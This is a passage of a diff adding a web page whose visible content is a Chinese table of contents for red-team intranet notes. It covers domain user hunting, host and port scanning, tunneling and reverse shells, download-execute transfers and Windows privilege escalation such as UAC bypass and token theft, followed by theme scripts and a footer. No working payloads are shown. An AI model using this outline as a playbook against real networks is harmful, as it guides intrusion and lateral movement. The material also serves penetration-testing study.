+<li><a href=#162-pvefindaduserexehttpsgithubcomchrisdeetoolstreemasteradadfindusersloggedon--current>1.6.2. <a href=https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn>PVEFindADUser.exe</a> -current</a></li>
+<li><a href=#163-netviewexehttpsgithubcommubixnetviewgit>1.6.3. <a href=https://github.com/mubix/netview.git>netview.exe</a></a></li>
+<li><a href=#164-nmap---script-smb-enum-sessions--ip>1.6.4. nmap &ndash;script smb-enum-sessions &lt;ip></a></li>
+<li><a href=#165-powersploithttpsgithubcompowershellempirepowertoolstreemasterpowerview>1.6.5. <a href=https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView>PowerSploit</a></a></li>
+<li><a href=#heading></a></li>
+<li><a href=#166-empire-situaltional_awarenessnetworkpowerviewuser_hunter>1.6.6. Empire >situaltional_awareness/network/powerview/user_hunter</a></li>
+</ul>
+</li>
+<li><a href=#17-查找域管理进程>1.7. 查找域管理进程</a>
+<ul>
+<li><a href=#171-dc的域用户会话>1.7.1. DC的域用户会话</a></li>
+<li><a href=#172-远程系统中运行的任务>1.7.2. 远程系统中运行的任务</a></li>
+<li><a href=#173-扫描远程系统netbios信息>1.7.3. 扫描远程系统NetBIOS信息</a></li>
+<li><a href=#174-域用户的进程-tasklist-v--findstr-hacker->1.7.4. 域用户的进程 <code>tasklist /v | findstr "hacker" </code></a></li>
+</ul>
+</li>
+<li><a href=#18-域分析工具bloodhoundhttpsgithubcombloodhoundadbloodhoundreleases>1.8. 域分析工具<a href=https://github.com/BloodHoundAD/BloodHound/releases>Bloodhound</a></a></li>
+<li><a href=#19-探测域内存活主机>1.9. 探测域内存活主机</a>
+<ul>
+<li><a href=#191-利用netbios探测-nbtexe-1921681024>1.9.1. 利用NetBIOS探测 <code>nbt.exe 192.168.1.0/24</code></a></li>
+<li><a href=#192-利用icmp协议探测>1.9.2. 利用ICMP协议探测</a></li>
+<li><a href=#193-利用arp协议探测-arpexe--t-1921681024>1.9.3. 利用ARP协议探测 <code>arp.exe -t 192.168.1.0/24</code></a></li>
+<li><a href=#194-通过tcpudp协议探测-nmap--st--su->1.9.4. 通过TCP/UDP协议探测 <code>nmap -sT -sU </code></a></li>
+</ul>
+</li>
+<li><a href=#110-扫描域内端口>1.10. 扫描域内端口</a>
+<ul>
+<li><a href=#1101-netcat扫描>1.10.1. netcat扫描</a></li>
+<li><a href=#1102-利用telnet命令扫描-telnet-ip-port>1.10.2. 利用telnet命令扫描 <code>telnet &lt;ip> &lt;port></code></a></li>
+<li><a href=#1103-利用msfconsole--use-auxiliaryscannerportscantcp>1.10.3. 利用msfconsole <code>use auxiliary/scanner/portscan/tcp</code></a></li>
+<li><a href=#1104-利用powersploit-invoke-portscan>1.10.4. 利用powersploit <code>Invoke-Portscan</code></a></li>
+<li><a href=#1105-利用nishang-invoke-portscan>1.10.5. 利用Nishang <code>Invoke-Portscan</code></a></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><a href=#21-基础知识>2.1. 基础知识</a>
+<ul>
+<li><a href=#211-隧道-一种绕过端口屏蔽的通信方式>2.1.1. 隧道-一种绕过端口屏蔽的通信方式</a></li>
+<li><a href=#212-内网连通性判断>2.1.2. 内网连通性判断</a>
+<ul>
+<li><a href=#2121-icmp协议-ping--baiducom>2.1.2.1. ICMP协议 <code>ping baidu.com</code></a></li>
+<li><a href=#2122-tcp协议-nc--zv-target--port>2.1.2.2. TCP协议 <code>nc -zv &lt;target> &lt;port></code></a></li>
+<li><a href=#2123-https协议-curl-targetport>2.1.2.3. HTTP(S)协议 <code>curl &lt;target>:&lt;port></code></a></li>
+<li><a href=#2124-dns协议-dig-vps-ip-wwwbaiducom-a>2.1.2.4. DNS协议 <code>dig @vps-ip www.baidu.com A</code></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#22-网络层层隧道技术>2.2. 网络层层隧道技术</a>
+<ul>
+<li><a href=#221-ipv6隧道-socat6tunnelnt6tunnel>2.2.1. IPv6隧道-socat，6tunnel，nt6tunnel</a></li>
+<li><a href=#222-icmp隧道-icmpshpingtunnelicmptunnelpowershell-icmp>2.2.2. ICMP隧道-icmpsh,pingTunnel,icmptunnel,powershell icmp</a>
+<ul>
+<li><a href=#2221-icmpshhttpsgithubcominquisbicmpsh>2.2.2.1. <a href=https://github.com/inquisb/icmpsh>icmpsh</a></a></li>
+<li><a href=#2222-pingtunnelhttpwwwcsuitnodanielspingtunnelpingtunnel-072targz>2.2.2.2. <a href=http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz>PingTunnel</a></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#23-传输层隧道技术>2.3. 传输层隧道技术</a>
+<ul>
+<li><a href=#231-socket隧道lcxportmap端口转发>2.3.1. Socket隧道：LCX/portmap端口转发</a></li>
+<li><a href=#232-netcat>2.3.2. Netcat</a>
+<ul>
+<li><a href=#2321-常见使用场景>2.3.2.1. 常见使用场景</a></li>
+<li><a href=#2322-获取shell>2.3.2.2. 获取shell</a></li>
+<li><a href=#2323-获取反向shell>2.3.2.3. 获取反向shell</a></li>
+<li><a href=#2324-netcat内网代理>2.3.2.4. Netcat内网代理</a></li>
+</ul>
+</li>
+<li><a href=#233-powercathttpsgithubcombesimorhinopowercatgit>2.3.3. <a href=https://github.com/besimorhino/powercat.git>PowerCat</a></a>
+<ul>
+<li><a href=#2331-powercat常用操作>2.3.3.1. powercat常用操作</a></li>
+<li><a href=#2332-powercat-dns隧道通信>2.3.3.2. powercat DNS隧道通信</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#24-应用层隧道技术>2.4. 应用层隧道技术</a>
+<ul>
+<li><a href=#241-ssh协议隧道>2.4.1. SSH协议隧道</a>
+<ul>
+<li><a href=#2411-本地端口转发>2.4.1.1. 本地端口转发</a></li>
+<li><a href=#2412-远程端口转发>2.4.1.2. 远程端口转发</a></li>
+<li><a href=#2413-动态端口转发加密socks>2.4.1.3. 动态端口转发（加密socks)</a></li>
+</ul>
+</li>
+<li><a href=#242-httphttps协议隧道>2.4.2. HTTP/HTTPS协议隧道</a>
+<ul>
+<li><a href=#2421-regeorghttpsgithubcomsensepostregeorggit>2.4.2.1. <a href=https://github.com/sensepost/reGeorg.git>reGeorg</a></a></li>
+<li><a href=#2422-proxytunnelhttpsgithubcomproxytunnelproxytunnelgit>2.4.2.2. <a href=https://github.com/proxytunnel/proxytunnel.git>proxytunnel</a></a></li>
+</ul>
+</li>
+<li><a href=#243-dns协议隧道>2.4.3. DNS协议隧道</a>
+<ul>
+<li><a href=#2431-dnscat2httpsgithubcomiagox86dnscat2git>2.4.3.1. <a href=https://github.com/iagox86/dnscat2.git>Dnscat2</a></a></li>
+<li><a href=#2432-iodinehttpsgithubcomyarrickiodinegit>2.4.3.2. <a href=https://github.com/yarrick/iodine.git>iodine</a></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#25-socks代理>2.5. SOCKS代理</a>
+<ul>
+<li><a href=#251-proxychainshttpproxychainssourceforgenet>2.5.1. <a href=http://proxychains.sourceforge.net/>Proxychains</a></a></li>
+<li><a href=#252-sockscap64httpswwwsockscap64com>2.5.2. <a href=https://www.sockscap64.com/>SocksCap64</a></a></li>
+<li><a href=#253-proxifierhttpswwwproxifiercom>2.5.3. <a href=https://www.proxifier.com>Proxifier</a></a></li>
+<li><a href=#254-earthwormhttpsgithubcomrootkiterearthwormgit>2.5.4. <a href=https://github.com/rootkiter/EarthWorm.git>EarthWorm</a></a></li>
+<li><a href=#255-termitehttpsgithubcomrootkitertermitegit>2.5.5. <a href=https://github.com/rootkiter/Termite.git>Termite</a></a></li>
+<li><a href=#256-regeorghttpsgithubcomsensepostregeorggit>2.5.6. <a href=https://github.com/sensepost/reGeorg.git>reGeorg</a></a></li>
+</ul>
+</li>
+<li><a href=#26-数据通信>2.6. 数据通信</a>
+<ul>
+<li><a href=#261-压缩数据>2.6.1. 压缩数据</a></li>
+<li><a href=#262-传输数据>2.6.2. 传输数据</a></li>
+<li><a href=#263-利用ftp协议>2.6.3. 利用FTP协议</a></li>
+<li><a href=#264-利用debug上传>2.6.4. 利用Debug上传</a></li>
+<li><a href=#265-利用nishang上传-download-execute>2.6.5. 利用Nishang上传-download-execute</a></li>
+<li><a href=#266-利用bitsadmin下载>2.6.6. 利用bitsadmin下载</a></li>
+<li><a href=#267-利用powershell下载>2.6.7. 利用powershell下载</a></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><a href=#31-系统内核溢出漏洞提权分析及防范>3.1. 系统内核溢出漏洞提权分析及防范</a>
+<ul>
+<li><a href=#311-ms16-032提权-kb3139914>3.1.1. MS16-032提权-KB3139914</a></li>
+</ul>
+</li>
+<li><a href=#32-windows操作系统配置错误利用分析及防范>3.2. windows操作系统配置错误利用分析及防范</a>
+<ul>
+<li><a href=#321-注册表键alwaysinstallelevated>3.2.1. 注册表键AlwaysInstallElevated</a></li>
+<li><a href=#322-可信任服务路径漏洞>3.2.2. 可信任服务路径漏洞</a></li>
+</ul>
+</li>
+<li><a href=#33-组策略首选项提权分析及防范>3.3. 组策略首选项提权分析及防范</a></li>
+<li><a href=#34-绕过uac提权分析及防范>3.4. 绕过UAC提权分析及防范</a></li>
+<li><a href=#35-令牌窃取分析及防范>3.5. 令牌窃取分析及防范</a></li>
+<li><a href=#36-无凭证条件下的权限分析及防范>3.6. 无凭证条件下的权限分析及防范</a></li>
+</ul>
+</nav>
+</div>
+</div>
+</section>
+</div>
+</div>
+<script>'use strict';var dollarCodeElem,gtCodeElem;function wrap(a,b){a.parentNode.insertBefore(b,a),b.appendChild(a)}(function(){var a=document.querySelector('.single__contents');a?a.querySelectorAll('pre > code').forEach(function(a){var b=a.getAttribute('data-lang'),d=document.createElement('div'),e=null,c=null;b&&b.includes(':')&&(e=b.split(':')[0],c=b.split(':')[1],d.className='language-'+e,d.setAttribute('data-lang',c),a.className='language-'+e,a.setAttribute('data-lang',c),a.setAttribute('id',c)),(!b||c)&&wrap(a.parentNode,d)}):null})(),dollarCodeElem=document.querySelectorAll('div.language-\\$'),gtCodeElem=document.querySelectorAll('div.language-\\>'),dollarCodeElem?dollarCodeElem.forEach(function(a){var b=a.parentNode.parentNode?a.parentNode.parentNode.querySelectorAll('.lnt'):null;b?b.forEach(function(a){a.innerHTML='$<br/>'}):null}):null,gtCodeElem?gtCodeElem.forEach(function(a){var b=a.parentNode.parentNode?a.parentNode.parentNode.querySelectorAll('.lnt'):null;b?b.forEach(function(a){a.innerHTML='><br/>'}):null}):null</script>
+<script defer src=/js/helper/getParents.min.js></script>
+<script defer src=/js/helper/closest.min.js></script>
+<script defer src=/js/helper/prev.min.js></script>
+<script defer src=/js/helper/prop.min.js></script>
+<script defer src=/js/helper/fadeinout.min.js></script>
+<script>document.addEventListener('DOMContentLoaded',function(){'use strict';var l=document.querySelectorAll('.single__contents > table'),d,i,a,n,k,p,h,c,m,b,g,f,e,o,j;for(let a=0;a<l.length;a++)d=l[a],i=document.createElement('div'),i.className='table-wrapper',d.parentElement.replaceChild(i,d),i.appendChild(d);a=JSON.parse("null"),a&&a.includes('mermaid')&&(n=localStorage.getItem('theme')||'light',n==="dark"?mermaid.initialize({theme:'dark'}):mermaid.initialize({theme:'default'}),k=[],[].push.apply(k,document.getElementsByClassName('language-mermaid')),k.forEach(function(b){var a=b.parentNode,c;a!==document.body&&(a.parentNode.insertBefore(b,a),a.parentNode.removeChild(a)),c=document.createElement('div'),c.classList.add('mermaid'),c.innerHTML=b.innerHTML,b.replaceWith(c)})),a&&a.includes('katex')&&(p=document.getElementsByClassName('math'),h={delimiters:[{left:"$$",right:"$$",display:!0},{left:"\\[",right:"\\]",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1}]},renderMathInElement(document.querySelector('.single__contents'),h)),a&&a.includes('flowchartjs')&&(h=JSON.parse('{"arrow-end":"block","element-color":"black","fill":"white","flowstate":{"approved":{"fill":"#58C4A3","font-size":12,"no-text":"n/a","yes-text":"APPROVED"},"current":{"fill":"yellow","font-color":"red","font-weight":"bold"},"future":{"fill":"#FFFF99"},"invalid":{"fill":"#444444"},"past":{"fill":"#CCCCCC","font-size":12},"rejected":{"fill":"#C45879","font-size":12,"no-text":"REJECTED","yes-text":"n/a"},"request":{"fill":"blue"}},"font-color":"black","font-size":14,"line-color":"black","line-length":50,"line-width":3,"no-text":"no","scale":1,"symbols":{"end":{"class":"end-element"},"start":{"element-color":"green","fill":"yellow","font-color":"red"}},"text-margin":10,"x":0,"y":0,"yes-text":"yes"}'),c=null,m="language-flowchart",b=0,Array.prototype.forEach.call(document.querySelectorAll("[class^="+m+"]"),function(a){var d,e;a.style.display='none',a.parentNode.style.backgroundColor="transparent",c=a.innerText,d=document.createElement('div'),d.id='flowchart'+b,a.parentNode.insertBefore(d,a),e=flowchart.parse(c),e.drawSVG("flowchart"+b,h),b+=1})),a&&a.includes('chart')&&(g="#666",f="#ddd",e=2,Chart.defaults.global.elements.rectangle.borderWidth=e,Chart.defaults.global.elements.rectangle.borderColor=g,Chart.defaults.global.elements.rectangle.backgroundColor=f,Chart.defaults.global.elements.line.borderWidth=e,Chart.defaults.global.elements.line.borderColor=g,Chart.defaults.global.elements.line.backgroundColor=f,Chart.defaults.global.elements.point.borderWidth=e,Chart.defaults.global.elements.point.borderColor=g,Chart.defaults.global.elements.point.backgroundColor=f,o="language-chart",b=0,c=null,Array.prototype.forEach.call(document.querySelectorAll("[class^="+o+"]"),function(a){var d,e,f,g;a.style.display='none',a.parentNode.style.backgroundColor="transparent",c=a.innerText,d=document.createElement('canvas'),e=null,d.height=200,d.style.height=200,d.id='myChart'+b,e=JSON.parse(c),a.parentNode.insertBefore(d,a),f=document.getElementById('myChart'+b).getContext('2d'),g=new Chart(f,e),b+=1})),a&&a.includes('viz')&&(j="language-viz-",Array.prototype.forEach.call(document.querySelectorAll("[class^="+j+"]"),function(a){var b,c;a.style.display='none',a.parentNode.style.backgroundColor="transparent",a.getAttribute("class").split(" ").forEach(function(a){a.startsWith(j)&&(b=a.substr(j.length))}),c=new Viz,c.renderSVGElement(a.innerText,{engine:b}).then(function(b){b.style.width="100%",a.parentNode.insertBefore(b,a)})}))})</script>
+<script>var singleMenu=document.getElementById('single-menu'),listMain=document.getElementById('list-main'),listSide=document.getElementById('list-side'),wideViewAsDefault=JSON.parse("null");enquire.register("screen and (max-width:1280px)",{match:function(){wideViewAsDefault?(singleMenu.className='hide',listMain.className='lm',listSide.className='r'):(singleMenu.className='l',listMain.className='m',listSide.className='r')},unmatch:function(){wideViewAsDefault?(singleMenu.className='hide',listMain.className='lm',listSide.className='r'):(singleMenu.className='l',listMain.className='m',listSide.className='r')}}).register("screen and (max-width:960px)",{match:function(){listSide.className='r',listMain.className='lm',singleMenu.className='hide'},unmatch:function(){wideViewAsDefault?(singleMenu.className='hide',listMain.className='lm',listSide.className='r'):(singleMenu.className='l',listMain.className='m',listSide.className='r')}}).register("screen and (max-width:600px)",{match:function(){listSide.className='hide',listMain.className='lmr',singleMenu.className='hide'},unmatch:function(){listSide.className='r',listMain.className='lm',singleMenu.className='hide'}})</script>
+<div class=bot>
+<footer class=footer>
+<div class=divider>
+<div class=lmr>
+<p class=caption>
+©2022, All Rights Reserved
+</p>
+<p class=caption>Powered by <a href=https://gohugo.io/ rel=noreferrer>Hugo</a> and the <a href=https://github.com/zzossig/hugo-theme-zdoc rel=noreferrer>zDoc theme</a></p>
+</div>
+</div>
+</footer>
+</div>
+</div>
+</body>
+</html>
